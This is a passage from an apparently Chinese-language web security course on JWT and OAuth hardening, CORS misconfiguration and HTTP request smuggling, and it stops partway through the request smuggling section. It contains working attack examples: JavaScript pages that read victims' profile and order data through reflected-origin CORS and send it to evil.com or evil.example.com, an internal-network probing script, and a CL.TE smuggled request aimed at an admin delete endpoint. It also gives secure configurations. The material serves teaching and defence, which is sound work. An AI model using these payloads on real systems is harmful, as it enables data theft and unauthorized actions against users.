使用强随机密钥（至少 256 位）\nSECRET_KEY = secrets.token_hex(32)  # 生成 64 字符的随机密钥\n# 或使用非对称加密（推荐）\n# 生成 RSA 密钥对：openssl genrsa -out private.pem 4096\n\ndef create_secure_token(user_id, role):\n    \"\"\"创建安全的 JWT Token\"\"\"\n    payload = {\n        \"user_id\": user_id,\n        \"role\": role,\n        \"iat\": datetime.utcnow(),\n        \"exp\": datetime.utcnow() + timedelta(hours=1),  # 短过期时间\n        \"jti\": secrets.token_hex(16),  # 唯一标识符，防止重放攻击\n    }\n    # 2. 明确指定算法，不接受 Token 中声明的算法\n    return jwt.encode(payload, SECRET_KEY, algorithm=\"HS256\")\n\ndef verify_secure_token(token):\n    \"\"\"安全地验证 JWT Token\"\"\"\n    try:\n        # 3. 严格指定允许的算法\n        payload = jwt.decode(\n            token,\n            SECRET_KEY,\n            algorithms=[\"HS256\"],     # 只允许 HS256\n            options={\n                \"require\": [\"exp\", \"iat\", \"jti\"],  # 4. 要求必须包含的字段\n                \"verify_exp\": True,    # 5. 验证过期时间\n            }\n        )\n        # 6. 检查 jti 是否在黑名单中（防止已撤销的 Token 被使用）\n        if is_token_revoked(payload[\"jti\"]):\n            raise jwt.InvalidTokenError(\"Token has been revoked\")\n        return payload\n    except jwt.ExpiredSignatureError:\n        raise AuthError(\"Token 已过期\")\n    except jwt.InvalidTokenError:\n        raise AuthError(\"Token 无效\")</code></pre></div>\n\n<h4>OAuth 2.0 安全最佳实践</h4>\n\n<ul>\n<li><strong>严格验证 redirect_uri</strong>：使用精确匹配，不接受通配符或子路径</li>\n<li><strong>始终使用 state 参数</strong>：生成随机的、不可预测的 state 值，并在回调时验证</li>\n<li><strong>使用 PKCE</strong>：即使使用授权码流程，也应该添加 PKCE 来防止授权码拦截</li>\n<li><strong>避免隐式流程</strong>：不要在 URL Fragment 中传递 Access Token</li>\n<li><strong>最小权限原则</strong>：只请求必要的 scope，不要过度授权</li>\n</ul>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># ✅ 安全的 OAuth 回调处理\n\n@app.route('/oauth/callback')\ndef oauth_callback():\n    code = request.args.get('code')\n    state = request.args.get('state')\n\n    # 1. 验证 state 参数（防止 CSRF）\n    expected_state = session.get('oauth_state')\n    if not state or not hmac.compare_digest(state, expected_state):\n        abort(403, \"State 验证失败\")\n\n    # 2. 验证 redirect_uri 一致性\n    expected_redirect = url_for('oauth_callback', _external=True)\n\n    # 3. 用授权码换取 Token（服务器端请求，不经过浏览器）\n    token_response = requests.post(\n        \"https://github.com/login/oauth/access_token\",\n        data={\n            \"client_id\": CLIENT_ID,\n            \"client_secret\": CLIENT_SECRET,\n            \"code\": code,\n            \"redirect_uri\": expected_redirect\n        },\n        headers={\"Accept\": \"application/json\"}\n    )\n\n    access_token = token_response.json()[\"access_token\"]\n\n    # 4. 用 Access Token 获取用户信息\n    user_info = requests.get(\n        \"https://api.github.com/user\",\n        headers={\"Authorization\": f\"token {access_token}\"}\n    ).json()\n\n    # 5. 清除 state，防止重放\n    session.pop('oauth_state', None)\n\n    # 完成登录\n    login_user(user_info)\n    return redirect('/dashboard')</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">认证安全要点总结</div>\n<p>\n<strong>JWT 安全</strong>：<br>\n- 使用强随机密钥（至少 256 位）或非对称加密<br>\n- 始终在验证时明确指定允许的算法列表<br>\n- 设置合理的 Token 过期时间<br>\n- 实现 Token 撤销机制（黑名单或短生命周期 + 刷新 Token）<br><br>\n<strong>OAuth 安全</strong>：<br>\n- 严格验证 redirect_uri，使用精确匹配<br>\n- 始终使用 state 参数防御 CSRF<br>\n- 优先使用授权码流程 + PKCE<br>\n- 服务器端交换 Token，不经过浏览器\n</p></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h3>实战练习</h3>\n\n<p>通过以下挑战来检验你对认证安全的理解：</p>\n\n<ul>\n<li>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF('ctf-017')\"><span class=\"arrow\">▶</span> CTF挑战: JWT伪造大师</button>\n<p>目标：CyberShop 的管理员 API 使用 JWT 认证。你需要发现 JWT 实现中的弱点，伪造一个管理员身份的 Token，获取 flag。提示：先分析 JWT 的 Header 和 Payload，尝试不同的攻击方式。</p>\n</li>\n<li>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF('ctf-018')\"><span class=\"arrow\">▶</span> CTF挑战: OAuth劫持</button>\n<p>目标：CyberShop 的 OAuth 登录功能存在 redirect_uri 验证缺陷。你需要利用这个缺陷劫持用户的授权码，获取 flag。提示：尝试不同的 redirect_uri 绕过技巧。</p>\n</li>\n</ul>\n\n<div class=\"callout info\"><div class=\"callout-title\">学习建议</div><p>JWT 和 OAuth 的安全需要理论与实践结合。建议使用 <strong>jwt_tool</strong> 和 <strong>Burp Suite</strong> 在本地测试环境中练习 JWT 攻击。对于 OAuth，可以阅读 <strong>OAuth 2.0 Threat Model and Security Considerations（RFC 6819）</strong>来全面了解潜在威胁。同时，<a href=\"https://jwt.io\" target=\"_blank\">jwt.io</a> 是一个很好的在线工具，可以直观地解码和验证 JWT Token。</p></div>";
+
+SECTION_CONTENT["web-09-01"] = "<div class=\"section-transition\"><p>在学完了注入、XSS、CSRF、文件上传等一系列攻击手段后，你可能会觉得 Web 安全已经没什么新花样了。但本章要介绍的两种攻击——<strong>CORS 配置错误</strong>和 <strong>HTTP 请求走私</strong>——代表了 Web 安全的前沿领域。它们不是传统的\"输入验证\"问题，而是源于浏览器安全模型和 HTTP 协议本身的复杂性。</p></div>\n\n<h2>CORS 与 HTTP 请求走私</h2>\n\n<p>本章的主题是<strong>\"跨越边界：浏览器安全模型的攻防\"</strong>。我们将深入探讨两种截然不同但同样危险的攻击方式：一种利用了浏览器跨域资源共享机制的配置缺陷，另一种则利用了 HTTP 协议在多层代理架构中的解析差异。这两种攻击分别代表了 Web 安全中\"应用层\"和\"协议层\"的前沿战场。</p>\n\n<h3>一、CORS 是什么</h3>\n\n<h4>1.1 同源策略（Same-Origin Policy）</h4>\n\n<p>要理解 CORS，我们必须先理解浏览器的<strong>同源策略</strong>。这是浏览器安全模型的基石之一，由 Netscape 在 1995 年首次引入，至今仍是所有现代浏览器的核心安全机制。</p>\n\n<p>所谓\"同源\"，是指两个 URL 的<strong>协议（Protocol）</strong>、<strong>域名（Host）</strong>和<strong>端口（Port）</strong>完全一致：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 同源判断示例\n\nhttps://www.cybershop.com/page    → 基准 URL\nhttps://www.cybershop.com/api     → ✅ 同源（路径不同不影响）\nhttp://www.cybershop.com/page     → ❌ 协议不同\nhttps://api.cybershop.com/page    → ❌ 域名不同\nhttps://www.cybershop.com:8080/p  → ❌ 端口不同</code></pre></div>\n\n<p>同源策略规定：<strong>一个源的 JavaScript 代码不能读取或修改另一个源的页面内容</strong>。具体来说，以下操作会被浏览器拦截：</p>\n\n<ul>\n<li>通过 <code>XMLHttpRequest</code> 或 <code>fetch</code> 发起跨域请求并读取响应</li>\n<li>通过 <code>document.cookie</code> 访问跨域页面设置的 Cookie</li>\n<li>通过 <code>localStorage</code> / <code>sessionStorage</code> 访问跨域存储的数据</li>\n<li>通过 <code>iframe</code> 读取跨域页面的 DOM 内容</li>\n</ul>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>同源策略限制的只是\"读取响应\"，而不是\"发送请求\"。例如，<code>&lt;img src=\"https://other-site.com/image.png\"&gt;</code>、<code>&lt;script src=\"https://cdn.example.com/lib.js\"&gt;</code>、<code>&lt;form action=\"https://other-site.com/submit\"&gt;</code> 这些标签发起的跨域请求不会被拦截——这也是 CSRF 攻击能够成立的根本原因。浏览器拦截的是 JavaScript 通过 Ajax/Fetch 发起的跨域请求的<strong>响应读取</strong>。</p></div>\n\n<h4>1.2 为什么需要 CORS？</h4>\n\n<p>同源策略虽然有效防止了跨域数据窃取，但也给合法的跨域协作带来了障碍。现代 Web 应用大量依赖跨域 API 调用：</p>\n\n<ul>\n<li>前端部署在 <code>https://www.cybershop.com</code>，后端 API 在 <code>https://api.cybershop.com</code></li>\n<li>使用第三方服务（支付、地图、CDN 等）提供的 API</li>\n<li>不同子域之间的微服务通信</li>\n</ul>\n\n<p><strong>CORS（Cross-Origin Resource Sharing，跨域资源共享）</strong>就是为了解决这个矛盾而设计的。它是一套基于 HTTP 头部的机制，允许服务器<strong>显式声明</strong>哪些外部源可以访问自己的资源。</p>\n\n<h4>1.3 CORS 的工作流程</h4>\n\n<p>CORS 通过以下 HTTP 头部实现通信：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\"># 1. 浏览器自动附加 Origin 头部\nGET /api/user/profile HTTP/1.1\nHost: api.cybershop.com\nOrigin: https://www.cybershop.com\nCookie: session=abc123\n\n# 2. 服务器在响应中声明允许的源\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://www.cybershop.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization</code></pre></div>\n\n<p>对于\"非简单请求\"（如使用 PUT/DELETE 方法，或携带自定义头部），浏览器会先发送一个<strong>预检请求（Preflight）</strong>：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\"># 预检请求（OPTIONS 方法）\nOPTIONS /api/user/profile HTTP/1.1\nHost: api.cybershop.com\nOrigin: https://www.cybershop.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: Content-Type, Authorization\n\n# 服务器响应预检\nHTTP/1.1 204 No Content\nAccess-Control-Allow-Origin: https://www.cybershop.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 86400</code></pre></div>\n\n<p>只有预检通过后，浏览器才会发送实际的请求。整个流程可以用下图理解：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code>┌──────────┐                          ┌──────────────┐\n│  浏览器   │                          │  api.server  │\n│ www.site │                          │  .com        │\n└────┬─────┘                          └──────┬───────┘\n     │                                       │\n     │  ① OPTIONS (预检请求)                  │\n     │  Origin: https://www.site.com          │\n     │───────────────────────────────────────>│\n     │                                       │\n     │  ② 204 OK                             │\n     │  Allow-Origin: https://www.site.com    │\n     │<───────────────────────────────────────│\n     │                                       │\n     │  ③ PUT /api/data (实际请求)            │\n     │  Origin: https://www.site.com          │\n     │───────────────────────────────────────>│\n     │                                       │\n     │  ④ 200 OK + 响应数据                   │\n     │  Allow-Origin: https://www.site.com    │\n     │<───────────────────────────────────────│\n     │                                       │</code></pre></div>\n\n<h3>二、CORS 配置错误</h3>\n\n<p>CORS 的安全性完全依赖于服务器的配置。一旦配置不当，同源策略的保护就会被绕过。以下是几种常见的 CORS 配置错误：</p>\n\n<h4>2.1 通配符与凭据的组合</h4>\n\n<p>最危险的配置错误之一是同时设置了 <code>Access-Control-Allow-Origin: *</code> 和 <code>Access-Control-Allow-Credentials: true</code>：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\"># 危险配置\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n\n{\"user_id\": 10086, \"balance\": 50000, \"email\": \"victim@cybershop.com\"}</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>根据 CORS 规范，当 <code>Access-Control-Allow-Credentials: true</code> 时，<code>Access-Control-Allow-Origin</code> 不能设置为 <code>*</code>。大多数现代浏览器会拒绝这种组合。但问题在于：一些老旧的浏览器或自定义 HTTP 客户端并不严格执行这一规范。更常见的是，开发者在代码中动态反射 Origin 头部，实质上等同于 <code>*</code> 的效果。</p></div>\n\n<h4>2.2 反射 Origin 头部</h4>\n\n<p>许多开发者为了\"方便\"，选择在服务端动态地将请求中的 <code>Origin</code> 头部值直接回写到 <code>Access-Control-Allow-Origin</code> 响应头中：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 危险的 CORS 配置 —— 反射 Origin\n@app.after_request\ndef add_cors_headers(response):\n    origin = request.headers.get('Origin', '')\n    # 无论 Origin 是什么，都直接反射回去\n    response.headers['Access-Control-Allow-Origin'] = origin\n    response.headers['Access-Control-Allow-Credentials'] = 'true'\n    return response</code></pre></div>\n\n<p>这种配置的效果是：<strong>任何网站都可以跨域读取该 API 的响应</strong>，包括携带用户认证 Cookie 的请求。这等同于完全关闭了同源策略对该 API 的保护。</p>\n\n<h4>2.3 宽松的 Origin 验证</h4>\n\n<p>有些服务器会尝试对 Origin 进行验证，但验证逻辑存在缺陷：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 缺陷验证：仅检查是否包含可信域名\ndef check_origin(origin):\n    if 'cybershop.com' in origin:  # ❌ 不安全的子串匹配\n        return origin\n    return None\n\n# 攻击者可以构造以下 Origin 绕过：\n# https://cybershop.com.evil.com      → 包含 \"cybershop.com\" ✅\n# https://evilcybershop.com            → 包含 \"cybershop.com\" ✅\n# https://cybershop.com%40evil.com     → 包含 \"cybershop.com\" ✅</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 缺陷验证：仅检查后缀\ndef check_origin_suffix(origin):\n    if origin.endswith('.cybershop.com'):  # ❌ 不安全的后缀匹配\n        return origin\n    return None\n\n# 攻击者可以构造以下 Origin 绕过：\n# https://evil-cybershop.com  → 不以 .cybershop.com 结尾 ❌\n# 但如果是检查 'cybershop.com' 后缀：\n# https://attacker-cybershop.com → 可能绕过某些实现</code></pre></div>\n\n<h4>2.4 Null Origin 漏洞</h4>\n\n<p>当请求来自沙盒环境（如 <code>iframe</code> 中的 <code>sandbox</code> 属性页面、本地文件、或重定向后的请求）时，浏览器会将 <code>Origin</code> 设置为 <code>null</code>。如果服务器错误地允许了 <code>null</code> Origin：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\"># 服务器错误地允许 null Origin\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true</code></pre></div>\n\n<p>攻击者可以利用 <code>iframe</code> 的 sandbox 属性来构造一个 <code>Origin: null</code> 的请求：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 攻击者页面中\nvar iframe = document.createElement('iframe');\niframe.sandbox = 'allow-scripts allow-forms'; // 使 Origin 变为 null\niframe.srcdoc = `\n&lt;script&gt;\nfetch('https://api.cybershop.com/user/profile', {\n    credentials: 'include'\n}).then(r => r.json()).then(data => {\n    // 窃取到的数据发送到攻击者服务器\n    fetch('https://evil.com/steal', {\n        method: 'POST',\n        body: JSON.stringify(data)\n    });\n});\n&lt;/script&gt;\n`;\ndocument.body.appendChild(iframe);</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>三、CORS 攻击实战</h3>\n\n<h4>3.1 场景：CyberShop 的 CORS 漏洞</h4>\n\n<p>CyberShop 的后端 API 部署在 <code>https://api.cybershop.com</code>，前端部署在 <code>https://www.cybershop.com</code>。为了方便调试，运维人员在 API 网关上做了如下配置：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># CyberShop API 网关的 CORS 配置\n# 文件: nginx/conf.d/cors.conf 对应的后端逻辑\n\ndef handle_cors(request, response):\n    origin = request.headers.get('Origin', '')\n    \n    # \"灵活\"的 CORS 策略 —— 允许所有来源\n    if origin:\n        response.headers['Access-Control-Allow-Origin'] = origin\n        response.headers['Access-Control-Allow-Credentials'] = 'true'\n        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'\n        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With'\n    \n    return response</code></pre></div>\n\n<p>这个配置的问题在于：它无条件地反射任何 Origin，并且允许携带凭据（Cookie）。攻击者小 E 发现了这个漏洞。</p>\n\n<h4>3.2 攻击步骤</h4>\n\n<p><strong>第一步：侦察</strong></p>\n\n<p>小 E 注意到 CyberShop 的 API 响应中包含 CORS 头部，决定测试其配置：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 测试 CORS 配置\ncurl -s -I -H \"Origin: https://evil.example.com\" \\\n     -H \"Cookie: session=user_session_token\" \\\n     https://api.cybershop.com/user/profile\n\n# 响应：\n# HTTP/1.1 200 OK\n# Access-Control-Allow-Origin: https://evil.example.com  ← 反射了攻击者的域名！\n# Access-Control-Allow-Credentials: true                 ← 允许携带 Cookie！\n# Content-Type: application/json</code></pre></div>\n\n<p>小 E 确认：服务器会将任意 Origin 反射回 <code>Access-Control-Allow-Origin</code> 头部，并且允许凭据。这意味着攻击者的网页可以跨域读取 API 的响应数据。</p>\n\n<p><strong>第二步：构造攻击页面</strong></p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 攻击者部署在 https://evil.example.com/steal.html 的恶意页面\n\n// 窃取用户个人资料\nfunction stealProfile() {\n    fetch('https://api.cybershop.com/user/profile', {\n        method: 'GET',\n        credentials: 'include',  // 关键：携带目标域的 Cookie\n        headers: {\n            'Content-Type': 'application/json'\n        }\n    })\n    .then(response => response.json())\n    .then(data => {\n        console.log('窃取到的用户数据:', data);\n        // 将窃取到的数据发送到攻击者的收集服务器\n        exfiltrate(data);\n    })\n    .catch(err => console.log('请求失败:', err));\n}\n\n// 窃取用户的订单信息\nfunction stealOrders() {\n    fetch('https://api.cybershop.com/user/orders', {\n        method: 'GET',\n        credentials: 'include'\n    })\n    .then(response => response.json())\n    .then(data => {\n        console.log('窃取到的订单数据:', data);\n        exfiltrate(data);\n    });\n}\n\n// 数据外传\nfunction exfiltrate(data) {\n    // 方法1：通过 fetch 发送到攻击者服务器\n    fetch('https://evil.example.com/collect', {\n        method: 'POST',\n        body: JSON.stringify(data),\n        headers: { 'Content-Type': 'application/json' }\n    });\n    \n    // 方法2：通过图片请求（更隐蔽）\n    var img = new Image();\n    img.src = 'https://evil.example.com/beacon?data=' \n            + encodeURIComponent(btoa(JSON.stringify(data)));\n}\n\n// 当已登录的 CyberShop 用户访问攻击者页面时，自动执行\ndocument.addEventListener('DOMContentLoaded', function() {\n    stealProfile();\n    stealOrders();\n});</code></pre></div>\n\n<p><strong>第三步：诱导用户访问</strong></p>\n\n<p>攻击者通过钓鱼邮件、论坛嵌入等方式诱导已登录 CyberShop 的用户访问恶意页面。当用户的浏览器加载该页面时：</p>\n\n<ol>\n<li>恶意 JavaScript 向 <code>api.cybershop.com</code> 发起 fetch 请求</li>\n<li>浏览器自动附加用户在 <code>cybershop.com</code> 域下的 Cookie（因为 <code>credentials: 'include'</code>）</li>\n<li>API 服务器返回用户的敏感数据，并在响应头中包含 <code>Access-Control-Allow-Origin: https://evil.example.com</code></li>\n<li>浏览器检查 CORS 头部，发现 Origin 被允许，于是<strong>允许 JavaScript 读取响应</strong></li>\n<li>恶意脚本将窃取到的数据发送到攻击者的服务器</li>\n</ol>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code>┌──────────────┐                     ┌─────────────────┐\n│ 用户浏览器    │                     │ api.cybershop   │\n│              │                     │   .com          │\n│ 当前页面：    │                     │                 │\n│ evil.example │                     │                 │\n│   .com       │                     │                 │\n└──────┬───────┘                     └────────┬────────┘\n       │                                      │\n       │  GET /user/profile                   │\n       │  Cookie: session=victim_token        │\n       │  Origin: https://evil.example.com    │\n       │─────────────────────────────────────>│\n       │                                      │\n       │  200 OK                              │\n       │  Allow-Origin: evil.example.com ←──┐ │\n       │  Allow-Credentials: true           │ │\n       │  {\"email\":\"user@corp.com\",...}     │ │\n       │<─────────────────────────────────────│ │\n       │                                      │\n       │  ✅ 浏览器允许 JS 读取响应            │\n       │     （因为 Origin 被允许）           │\n       │                                      │\n       │  POST https://evil.com/collect  ────────────> 攻击者服务器\n       │  body: {\"email\":\"user@corp.com\",...}\n       │                                      │</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>CORS 攻击与 CSRF 攻击的关键区别：<strong>CSRF 是利用浏览器自动附加 Cookie 来\"执行操作\"（写），攻击者不需要读取响应</strong>；而 <strong>CORS 错误配置允许攻击者\"读取\"跨域 API 的响应数据（读）</strong>。CSRF 通常不需要 CORS 头部的配合，而 CORS 攻击的核心目标是窃取敏感数据。</p></div>\n\n<h4>3.3 进阶攻击：利用 CORS 链式漏洞</h4>\n\n<p>CORS 配置错误还可以与其他漏洞组合，形成更强大的攻击链：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-javascript\">// 链式攻击：CORS 错误配置 + 内网探测\n\n// 当用户在企业内网访问攻击者页面时\n// 利用 CORS 错误配置探测内网服务\nfunction scanInternalNetwork() {\n    const internalIPs = [\n        'http://192.168.1.1',      // 路由器\n        'http://192.168.1.100',    // 内部服务器\n        'http://10.0.0.50',        // 数据库管理面板\n        'http://172.16.0.10'       // 内部 Wiki\n    ];\n    \n    internalIPs.forEach(ip => {\n        // 如果内网服务也配置了宽松的 CORS\n        fetch(ip + '/api/status', { credentials: 'include' })\n        .then(r => r.text())\n        .then(data => {\n            console.log(`[+] ${ip} 可达，响应: ${data.substring(0, 100)}`);\n            exfiltrate({ target: ip, data: data });\n        })\n        .catch(() => {\n            console.log(`[-] ${ip} 不可达或无 CORS 漏洞`);\n        });\n    });\n}</code></pre></div>\n\n<h3>四、正确的 CORS 配置</h3>\n\n<h4>4.1 动态 Origin 白名单验证</h4>\n\n<p>正确的做法是维护一个可信源的白名单，并在运行时动态匹配：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 正确的 CORS 配置 —— 基于白名单的动态验证\n\n# 可信源白名单\nALLOWED_ORIGINS = {\n    'https://www.cybershop.com',\n    'https://admin.cybershop.com',\n    'https://mobile.cybershop.com',\n}\n\ndef handle_cors(request, response):\n    origin = request.headers.get('Origin', '')\n    \n    # 严格匹配：Origin 必须在白名单中\n    if origin in ALLOWED_ORIGINS:\n        response.headers['Access-Control-Allow-Origin'] = origin\n        response.headers['Access-Control-Allow-Credentials'] = 'true'\n        response.headers['Access-Control-Allow-Methods'] = 'GET, POST'\n        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'\n        # 添加 Vary 头部，确保 CDN 不会缓存错误的 CORS 响应\n        response.headers['Vary'] = 'Origin'\n    \n    # 如果 Origin 不在白名单中，不添加任何 CORS 头部\n    # 浏览器将阻止 JavaScript 读取响应\n    return response</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p><code>Vary: Origin</code> 头部非常重要。它告诉 CDN 和代理缓存：<strong>相同的 URL 对不同 Origin 可能返回不同的响应</strong>。如果不设置这个头部，CDN 可能会将包含 <code>Access-Control-Allow-Origin: https://www.cybershop.com</code> 的缓存响应返回给来自 <code>evil.com</code> 的请求——导致合法用户反而无法跨域访问。</p></div>\n\n<h4>4.2 Nginx 中的安全 CORS 配置</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Nginx 安全 CORS 配置示例\n\n# 定义可信源映射\nmap $http_origin $cors_origin {\n    default                     \"\";\n    \"https://www.cybershop.com\"  \"$http_origin\";\n    \"https://admin.cybershop.com\" \"$http_origin\";\n    \"https://mobile.cybershop.com\" \"$http_origin\";\n}\n\nserver {\n    location /api/ {\n        # 只有匹配白名单的 Origin 才会设置 CORS 头部\n        if ($cors_origin != \"\") {\n            add_header 'Access-Control-Allow-Origin' $cors_origin always;\n            add_header 'Access-Control-Allow-Credentials' 'true' always;\n            add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;\n            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;\n            add_header 'Vary' 'Origin' always;\n        }\n        \n        # 处理预检请求\n        if ($request_method = 'OPTIONS') {\n            return 204;\n        }\n        \n        proxy_pass http://backend;\n    }\n}</code></pre></div>\n\n<h4>4.3 CORS 安全最佳实践清单</h4>\n\n<ul>\n<li><strong>永远不要反射任意 Origin</strong>：使用白名单机制，只允许已知的可信源</li>\n<li><strong>永远不要使用 <code>Access-Control-Allow-Origin: *</code> 搭配敏感 API</strong>：如果 API 需要认证，就不能使用通配符</li>\n<li><strong>添加 <code>Vary: Origin</code> 头部</strong>：防止 CDN 缓存导致的 CORS 混乱</li>\n<li><strong>不要使用正则表达式或子串匹配验证 Origin</strong>：容易被绕过</li>\n<li><strong>最小权限原则</strong>：只允许必要的 HTTP 方法和头部</li>\n<li><strong>定期审计 CORS 配置</strong>：使用自动化工具扫描 CORS 错误配置</li>\n</ul>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h3>五、HTTP 请求走私：协议层的攻击</h3>\n\n<p>现在我们切换到一种完全不同的攻击类别。<strong>HTTP 请求走私（HTTP Request Smuggling）</strong>不是利用应用代码的漏洞，而是利用 HTTP 协议在多层架构中的<strong>解析差异</strong>。这是一种\"协议层\"攻击，影响的是 Web 基础设施本身。</p>\n\n<h4>5.1 现代 Web 的多层架构</h4>\n\n<p>现代 Web 应用通常不是用户浏览器直接与后端服务器通信，而是经过多个中间层：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code>用户浏览器\n    │\n    │  HTTP 请求\n    ▼\n┌─────────────────┐\n│   CDN / WAF     │  ← 前端层（Front-end）\n│  (CloudFlare,   │     负责缓存、负载均衡、安全防护\n│   Nginx, HAProxy)│\n└────────┬────────┘\n         │  HTTP 请求（复用连接）\n         ▼\n┌─────────────────┐\n│  应用服务器      │  ← 后端层（Back-end）\n│  (Tomcat,       │     负责业务逻辑处理\n│   Gunicorn,     │\n│   Express)      │\n└─────────────────┘</code></pre></div>\n\n<p>前端和后端之间为了提高性能，通常会<strong>复用同一个 TCP 连接</strong>来传输多个 HTTP 请求。这就产生了一个关键问题：<strong>前端和后端如何确定一个请求在哪里结束、下一个请求从哪里开始？</strong></p>\n\n<h4>5.2 请求边界的判定：Content-Length 与 Transfer-Encoding</h4>\n\n<p>HTTP/1.1 协议定义了两种方式来标识请求体的长度：</p>\n\n<p><strong>方式一：Content-Length（CL）</strong></p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\">POST /api/login HTTP/1.1\nHost: www.cybershop.com\nContent-Length: 27\n\nusername=admin&password=123</code></pre></div>\n\n<p><code>Content-Length</code> 直接声明请求体的字节数，接收方按此长度读取请求体。</p>\n\n<p><strong>方式二：Transfer-Encoding: chunked（TE）</strong></p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\">POST /api/login HTTP/1.1\nHost: www.cybershop.com\nTransfer-Encoding: chunked\n\nb\nusername=ad\nc\nmin&password=\n3\n123\n0\n\n</code></pre></div>\n\n<p>分块传输中，每个块以十六进制长度值开头，以长度为 <code>0</code> 的块表示结束。</p>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>HTTP/1.1 规范（RFC 7230）明确指出：当一个请求<strong>同时包含</strong> <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 头部时，应该<strong>忽略 Content-Length</strong>，优先使用 Transfer-Encoding。但实际中，不同的服务器和代理对这个规则的实现并不一致——这就是请求走私漏洞的根源。</p></div>\n\n<h4>5.3 CL.TE 漏洞</h4>\n\n<p><strong>CL.TE</strong> 表示：前端服务器使用 <code>Content-Length</code> 确定请求边界，后端服务器使用 <code>Transfer-Encoding</code> 确定请求边界。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code>CL.TE 请求走私原理：\n\n前端（CL）看到的内容：                后端（TE）看到的内容：\n┌─────────────────────────┐          ┌─────────────────────────┐\n│ POST / HTTP/1.1         │          │ POST / HTTP/1.1         │\n│ Content-Length: 35      │          │ Transfer-Encoding:chunked│\n│ Transfer-Encoding:chunked│          │                         │\n│                         │          │ 0                       │\n│ 0                       │          │                         │\n│                         │          │ └── 请求1结束（0长度块）│\n│ GET /admin HTTP/1.1     │          │                         │\n│ Host: target.com        │          │ GET /admin HTTP/1.1  ←──│── 被\"走私\"\n│                         │          │ Host: target.com        │    的请求\n└─────────────────────────┘          └─────────────────────────┘\n\n前端将整个内容视为一个请求（35字节）    后端在 \"0\\r\\n\\r\\n\" 处就认为请求结束了\n                                       剩余的 \"GET /admin\" 被当作下一个请求</code></pre></div>\n\n<p>让我们用具体的 HTTP 请求来看：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\"># CL.TE 走私请求原始内容\n\nPOST /search HTTP/1.1\nHost: www.cybershop.com\nContent-Length: 71\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete-user?id=1 HTTP/1.1\nHost: www.cybershop.com\nContent-Length: 10\n\nx=1</code></pre></div>\n\n<p><strong>前端的处理</strong>：看到 <code>Content-Length: 71</code>，于是从请求体开始读取 71 字节作为一个完整的请求体。走私的内容被\"隐藏\"在这个请求体中，前端不会察觉。</p>\n\n<p><strong>后端的处理</strong>：看到 <code>Transfer-Encoding: chunked</code>，于是按分块格式解析。遇到第一个块大小为 <code>0</code>，认为请求体结束。之后的 <code>GET /admin/delete-user</code> 被当作连接上的下一个请求来处理。</p>\n\n<h4>5.4 TE.CL 漏洞</h4>\n\n<p><strong>TE.CL</strong> 